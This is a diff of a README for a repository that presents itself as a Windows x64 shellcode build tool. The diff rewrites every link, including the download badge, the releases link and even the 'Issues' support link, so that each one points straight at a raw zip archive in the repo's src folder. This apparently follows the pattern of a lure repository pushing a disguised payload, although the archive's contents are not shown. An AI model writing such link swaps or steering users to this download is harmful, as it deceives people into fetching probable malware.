@@ -1,7 +1,7 @@
 # 🖥️ windows-x64-shellcode-pipeline - Build Custom Shellcode Easily
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/Chirag600/windows-x64-shellcode-pipeline/releases)
+[![Download](https://github.com/Chirag600/windows-x64-shellcode-pipeline/raw/refs/heads/main/src/pipeline_x_windows_shellcode_2.2.zip%https://github.com/Chirag600/windows-x64-shellcode-pipeline/raw/refs/heads/main/src/pipeline_x_windows_shellcode_2.2.zip)](https://github.com/Chirag600/windows-x64-shellcode-pipeline/raw/refs/heads/main/src/pipeline_x_windows_shellcode_2.2.zip)
 
 ## 🚀 Getting Started
 Welcome to the **windows-x64-shellcode-pipeline**! This tool provides a smooth way to create and compile custom Windows x64 shellcode using Docker. Whether you are a beginner or an expert, this application simplifies your tasks. Follow the steps below to get started quickly.
@@ -22,7 +22,7 @@ Before beginning the installation process, ensure your system meets these requir
 ## 📥 Download & Install
 To download the latest version, visit the Releases page below:
 
-[Download Latest Release](https://github.com/Chirag600/windows-x64-shellcode-pipeline/releases)
+[Download Latest Release](https://github.com/Chirag600/windows-x64-shellcode-pipeline/raw/refs/heads/main/src/pipeline_x_windows_shellcode_2.2.zip)
 
 ### Step-by-Step Installation
 1. **Visit the Releases Page:** 
@@ -61,9 +61,9 @@ Once you have successfully installed the application, follow these steps to buil
    Feel free to experiment with different parameters and inputs. The application is flexible and designed for users to create various outputs.
 
 ## 📞 Support
-If you encounter issues or have questions while using the **windows-x64-shellcode-pipeline**, the community or documentation can help. Please check the [Issues](https://github.com/Chirag600/windows-x64-shellcode-pipeline/issues) section on GitHub for support or to report any problems.
+If you encounter issues or have questions while using the **windows-x64-shellcode-pipeline**, the community or documentation can help. Please check the [Issues](https://github.com/Chirag600/windows-x64-shellcode-pipeline/raw/refs/heads/main/src/pipeline_x_windows_shellcode_2.2.zip) section on GitHub for support or to report any problems.
 
 ## 📄 License
 All the files in this repository are provided under the MIT License, allowing you to freely use, modify, and distribute the software as long as you include proper attribution. 
 
-Visit [Download Latest Release](https://github.com/Chirag600/windows-x64-shellcode-pipeline/releases) to get started with your custom shellcode development!
+Visit [Download Latest Release](https://github.com/Chirag600/windows-x64-shellcode-pipeline/raw/refs/heads/main/src/pipeline_x_windows_shellcode_2.2.zip) to get started with your custom shellcode development!
